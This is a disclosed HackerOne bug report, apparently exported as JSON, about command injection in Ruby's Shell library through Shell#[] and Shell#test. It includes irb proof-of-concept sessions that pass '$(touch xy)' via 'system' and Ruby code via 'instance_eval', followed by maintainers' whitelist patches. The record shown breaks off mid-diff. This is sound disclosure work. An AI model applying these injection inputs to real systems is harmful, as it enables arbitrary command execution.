{"id":327512,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMjc1MTI=","url":"https://hackerone.com/reports/327512","title":"Potential command injection in `Shell#[]` and `Shell#test`","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2018-03-19T20:33:10.989Z","submitted_at":"2018-03-19T20:33:10.989Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ooooooo_q","url":"/ooooooo_q","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":7724,"url":"https://hackerone.com/ruby","handle":"ruby","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Ruby","twitter_handle":"","website":"https://www.ruby-lang.org","about":"A Programmer's Best Friend"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-10-16T23:15:28.407Z","bug_reporter_agreed_on_going_public_at":"2019-10-16T23:15:28.314Z","team_member_agreed_on_going_public_at":"2019-10-16T23:10:46.538Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"As `Shell#test` and `Shell#[]` use `send` when transferring to FileTest, private methods etc. can also be called. Therefore, command injection is possible when a crafted value is passed.\n\n```ruby\n$ irb\nirb(main):001:0\u003e `ls xy`\nls: xy: No such file or directory\n=\u003e \"\"\n\nirb(main):002:0\u003e require 'shell'\n=\u003e true\nirb(main):003:0\u003e sh = Shell.new\n=\u003e #\u003cShell:0x00007fc0c20f2a78\u003e\nirb(main):004:0\u003e sh['system', '$(touch xy)']\nsh: /private/tmp/: is a directory\n=\u003e false\n\nirb(main):005:0\u003e `ls xy`\n=\u003e \"xy\\n\"\n```\n\nSince send is executed after the file path is converted to absolute path, it is difficult with `instance_eval` and `open` etc, but you can execute it using a subshell.\n\n## Impact\n\nIt seems almost unlikely that user input is given for the purpose, so it probably will not be affected in most cases.\nIt may be feasible under complex conditions such as combining object injection and other problems.","vulnerability_information_html":"\u003cp\u003eAs \u003ccode\u003eShell#test\u003c/code\u003e and \u003ccode\u003eShell#[]\u003c/code\u003e use \u003ccode\u003esend\u003c/code\u003e when transferring to FileTest, private methods etc. can also be called. Therefore, command injection is possible when a crafted value is passed.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003eirb\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e001\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"sb\"\u003e`ls xy`\u003c/span\u003e\n\u003cspan class=\"ss\"\u003els: xy: \u003c/span\u003e\u003cspan class=\"no\"\u003eNo\u003c/span\u003e \u003cspan class=\"n\"\u003esuch\u003c/span\u003e \u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"n\"\u003eor\u003c/span\u003e \u003cspan class=\"n\"\u003edirectory\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e002\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;shell\u0026#39;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e003\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003esh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eShell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e#\u0026lt;Shell:0x00007fc0c20f2a78\u0026gt;\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e004\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;system\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;$(touch xy)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"ss\"\u003esh: \u003c/span\u003e\u003cspan class=\"sr\"\u003e/private/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"n\"\u003eis\u003c/span\u003e \u003cspan class=\"n\"\u003ea\u003c/span\u003e \u003cspan class=\"n\"\u003edirectory\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kp\"\u003efalse\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e005\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"sb\"\u003e`ls xy`\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;xy\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSince send is executed after the file path is converted to absolute path, it is difficult with \u003ccode\u003einstance_eval\u003c/code\u003e and \u003ccode\u003eopen\u003c/code\u003e etc, but you can execute it using a subshell.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eIt seems almost unlikely that user input is given for the purpose, so it probably will not be affected in most cases.\u003cbr\u003e\nIt may be feasible under complex conditions such as combining object injection and other problems.\u003c/p\u003e\n","bounty_amount":"200.0","formatted_bounty":"$200","weakness":{"id":58,"name":"Command Injection - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-15T23:10:46.642Z","allow_singular_disclosure_after":-35360712.97323388,"singular_disclosure_allowed":true,"vote_count":1,"voters":["bl4de"],"severity":{"rating":"none","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2676030,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It is a pattern using `instance_eval`.\n(However, it seems that this will succeed only when the path is shallow.)\n\n```ruby\n$ irb\nirb(main):001:0\u003e `pwd`\n=\u003e \"/Users\\n\"\nirb(main):002:0\u003e require 'shell'\n=\u003e true\nirb(main):003:0\u003e sh = Shell.new\n=\u003e #\u003cShell:0x00007fba500c3d90\u003e\nirb(main):004:0\u003e sh['instance_eval', '.match (puts \"z\")']\nz\n=\u003e nil\n```","markdown_message":"\u003cp\u003eIt is a pattern using \u003ccode\u003einstance_eval\u003c/code\u003e.\u003cbr\u003e\n(However, it seems that this will succeed only when the path is shallow.)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight ruby\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e \u003cspan class=\"n\"\u003eirb\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e001\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"sb\"\u003e`pwd`\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;/Users\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e002\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"nb\"\u003erequire\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;shell\u0026#39;\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kp\"\u003etrue\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e003\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003esh\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"no\"\u003eShell\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nf\"\u003enew\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"c1\"\u003e#\u0026lt;Shell:0x00007fba500c3d90\u0026gt;\u003c/span\u003e\n\u003cspan class=\"n\"\u003eirb\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emain\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\u003cspan class=\"mo\"\u003e004\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003esh\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;instance_eval\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;.match (puts \u0026quot;z\u0026quot;)\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003cspan class=\"n\"\u003ez\u003c/span\u003e\n\u003cspan class=\"o\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"kp\"\u003enil\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2018-04-28T11:38:35.839Z","updated_at":"2018-04-28T11:38:35.839Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2768745,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ruby \nhi, Is this report eligible for processing?","markdown_message":"\u003cp\u003e\u003ca href=\"/ruby\"\u003e@ruby\u003c/a\u003e \u003cbr\u003e\nhi, Is this report eligible for processing?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-20T15:30:07.331Z","updated_at":"2018-05-20T15:30:07.331Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2803976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Sck, Sorry our late response.\n\nWe didn't investigate this yet. ","markdown_message":"\u003cp\u003eSck, Sorry our late response.\u003c/p\u003e\n\n\u003cp\u003eWe didn\u0026#39;t investigate this yet. \u003c/p\u003e\n","automated_response":false,"created_at":"2018-05-28T00:17:25.101Z","updated_at":"2018-05-28T00:17:25.101Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2804022,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-05-28T01:34:48.704Z","updated_at":"2018-05-28T01:34:48.704Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3582181,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hsbt\n\nWill this continue to be investigated?\n\nIt seems that there are no circumstances that actually pose a vulnerability problem and seems to be OK even if you close it.","markdown_message":"\u003cp\u003e\u003ca href=\"/hsbt\"\u003e@hsbt\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWill this continue to be investigated?\u003c/p\u003e\n\n\u003cp\u003eIt seems that there are no circumstances that actually pose a vulnerability problem and seems to be OK even if you close it.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-04T01:26:11.274Z","updated_at":"2018-11-04T01:26:11.274Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3695985,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ooooooo_q It's vulnerability. We are fixing it in next release.","markdown_message":"\u003cp\u003e\u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e It\u0026#39;s vulnerability. We are fixing it in next release.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-22T08:28:24.999Z","updated_at":"2018-11-22T08:28:24.999Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3696375,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ooooooo_q Can you confirm attached patch for fixing this vulnerability?","markdown_message":"\u003cp\u003e\u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e Can you confirm attached patch for fixing this vulnerability?\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-22T08:47:36.293Z","updated_at":"2018-11-22T08:47:36.293Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":379280,"filename":"shell-fix.patch","type":"text/x-diff","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/379/280/dd16fcff53ad4d8cdb233a337324ca3f7cc24b11/shell-fix.patch?response-content-disposition=attachment%3B%20filename%3D%22shell-fix.patch%22%3B%20filename%2A%3DUTF-8%27%27shell-fix.patch\u0026response-content-type=text%2Fx-diff\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRVDVIAIN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053559Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCIE32Mqh2tZr%2BOU5TpCkMAcCIP7cUR4Cmx6knF0aE1pAIhANosl%2BxHV6Q%2F51LP%2Fec3HeAsrkcv3Oonagtggk2l2fcHKrQDCFYQARoMMDEzNjE5Mjc0ODQ5IgyvivkNb%2F%2FihtanvJsqkQOxVl0vet745bZV8lQI5KYtwTWpcIFAsML7JxymD3vn9i8QCWhlYeT2MW%2B9baTQMb%2BdveMhrdwbKcBh3ip%2ByweQnVl9ueQzetzoXpB5k2WZrDCF3m0PA%2BCv6ox3XmJRewIkURiq4Ztl%2BHyUPdAtuOYZDYkHGUB8OqZgDmy0YoWLDqNPzGZK7dX7v62QUuo2TiCO%2BWHnWiVN2sIAHkLQ1c0cRYR2hre0%2FHfkXdHak9EM%2FJlTAH%2BQnt3DZGo6v788Hni0I1X%2F70QyGnfzTEgA8%2Fvb6vKESyULs14SrfKtlo9En1u2T1%2B79JNxVdhJNX%2BfERg06V3dMkcO%2BhECVPAWHzRrJ3bTOIIfgttUE3yW5ViJmecveb28ezf1szEuiXvW%2BZQUdTtFctgvSq22L57hu2QitzJ%2F7EFXuPPyfSKn70goiFML2nsYjayzP2jOzI85Wf0PZwwCg%2BTr7Ldre4VPxLs2y%2BAhqKPahi9iLDrk5IVFZPWBWrmRjgRlhjIP7aYZzYQEoqoD%2F3susXDMHlsiMv8yoDDN6ar%2FBTrqAdSZzhKXhWU9aDM9pF9urQto0LgyoOSxshu8McAhBrfa%2FReNxxcISybiMxPssa8oRShR7XUSBWuVRE7CnX5MQKY6UeaUB8HDokdym3sz7IA0tuq64XmfywVqSVqOZTRnXaNG%2BObO1m4FlOQ%2FC4n%2Fbe50N8rAEPnkWd81lyuaeMezjo4O%2BlEpCZ%2ByBXnfl88Bjx8KUaMIVJ5VHQ8J6PBiG%2FjOWow2rty2SDO%2BTqlQJxjPwbenYT7WUyEPOBmi%2FZgSy9qD6EP%2B5GMYGk0q2R6LmuTGm6QPTGNHaZ%2BHqK3PMyvOo0eC1hMcq6KJ8g%3D%3D\u0026X-Amz-Signature=dd903ce81d1bd2acfeb4c38dbff833a6ba4d8152c66012f1a2b05ec265b81b76"}],"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3697405,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@hsbt\nI confirmed the patch.\nIn most cases it will be fixed, but since `public_method` can execute `instance_eval`, the problem remains in the code.\nhttp://the.igreque.info/posts/2016/01-object-send-considered-harmful-en.html#can-public_send-avoid\n","markdown_message":"\u003cp\u003e\u003ca href=\"/hsbt\"\u003e@hsbt\u003c/a\u003e\u003cbr\u003e\nI confirmed the patch.\u003cbr\u003e\nIn most cases it will be fixed, but since \u003ccode\u003epublic_method\u003c/code\u003e can execute \u003ccode\u003einstance_eval\u003c/code\u003e, the problem remains in the code.\u003cbr\u003e\n\u003ca title=\"http://the.igreque.info/posts/2016/01-object-send-considered-harmful-en.html#can-public_send-avoid\" href=\"/redirect?url=http%3A%2F%2Fthe.igreque.info%2Fposts%2F2016%2F01-object-send-considered-harmful-en.html%23can-public_send-avoid\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://the.igreque.info/posts/2016/01-object-send-considered-harmful-en.html#can-public_send-avoid\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2018-11-22T13:37:57.785Z","updated_at":"2018-11-22T13:37:57.785Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4106862,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ooooooo_q I did escalate this to the original author of Shell library. \n","markdown_message":"\u003cp\u003e\u003ca href=\"/ooooooo_q\"\u003e@ooooooo_q\u003c/a\u003e I did escalate this to the original author of Shell library. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-02-07T04:41:36.590Z","updated_at":"2019-02-07T04:41:36.590Z","actor":{"username":"hsbt","cleared":false,"url":"/hsbt","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/051/808/c3eeedf7f0d1a3c3eead4e0106bbcc4441e0d9f5_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5780026,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"How about this?\n```diff\ndiff --git a/lib/shell/command-processor.rb b/lib/shell/command-processor.rb\nindex 5fe6056560..9a7a2332a3 100644\n--- a/lib/shell/command-processor.rb\n+++ b/lib/shell/command-processor.rb\n@@ -180,6 +180,9 @@ def test(command, file1, file2=nil)\n             top_level_test(command, file1)\n           end\n         else\n+          unless FileTest.methods(false).include?(command.to_s)\n+            raise \"unsupported command: #{ command }\"\n+          end\n           if file2\n             FileTest.send(command, file1, file2)\n           else\n```","markdown_message":"\u003cp\u003eHow about this?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/shell/command-processor.rb b/lib/shell/command-processor.rb\nindex 5fe6056560..9a7a2332a3 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/shell/command-processor.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/shell/command-processor.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -180,6 +180,9 @@\u003c/span\u003e def test(command, file1, file2=nil)\n             top_level_test(command, file1)\n           end\n         else\n\u003cspan class=\"gi\"\u003e+          unless FileTest.methods(false).include?(command.to_s)\n+            raise \u0026quot;unsupported command: #{ command }\u0026quot;\n+          end\n\u003c/span\u003e           if file2\n             FileTest.send(command, file1, file2)\n           else\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-09-11T13:42:12.517Z","updated_at":"2019-09-11T13:42:12.517Z","actor":{"username":"mame","cleared":false,"url":"/mame","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5780763,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mame It seems there is no problem.","markdown_message":"\u003cp\u003e\u003ca href=\"/mame\"\u003e@mame\u003c/a\u003e It seems there is no problem.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-09-11T15:48:40.659Z","updated_at":"2019-09-11T15:48:40.659Z","actor":{"username":"ooooooo_q","cleared":false,"url":"/ooooooo_q","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ruby","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5780910,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Agh, `command.to_s` -\u003e `command.to_sym`.  Thank you for the confirmation, anyway.\n\n```\ndiff --git a/lib/shell/command-processor.rb b/lib/shell/command-processor.rb\nindex 5fe6056560..9a7a2332a3 100644\n--- a/lib/shell/command-processor.rb\n+++ b/lib/shell/command-processor.rb\n@@ -180,6 +180,9 @@ def test(command, file1, file2=nil)\n             top_level_test(command, file1)\n           end\n         else\n+          unless FileTest.methods(false).include?(command.to_sym)\n+            raise \"unsupported command: #{ command }\"\n+          end\n           if file2\n             FileTest.send(command, file1, file2)\n           else\n```","markdown_message":"\u003cp\u003eAgh, \u003ccode\u003ecommand.to_s\u003c/code\u003e -\u0026gt; \u003ccode\u003ecommand.to_sym\u003c/code\u003e.  Thank you for the confirmation, anyway.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight diff\"\u003e\u003ccode\u003e\u003cspan class=\"gh\"\u003ediff --git a/lib/shell/command-processor.rb b/lib/shell/command-processor.rb\nindex 5fe6056560..9a7a2332a3 100644\n\u003c/span\u003e\u003cspan class=\"gd\"\u003e--- a/lib/shell/command-processor.rb\n\u003c/span\u003e\u003cspan class=\"gi\"\u003e+++ b/lib/shell/command-processor.rb\n\u003c/span\u003e\u003cspan class=\"p\"\u003e@@ -180,6 +180,9 @@\u003c/span\u003e def test(command, file1, file2=nil)\n             top_level_test(command, file1)\n           end\n         else\n\u003cspan class=\"gi\"\u003e+          unless FileTest.methods(false).include?(command.to_sym)\n+            raise \u0026quot;unsupported command: #{ command }\u0026quot;\n+          end\n\u003c/span\u003e           if file2\n             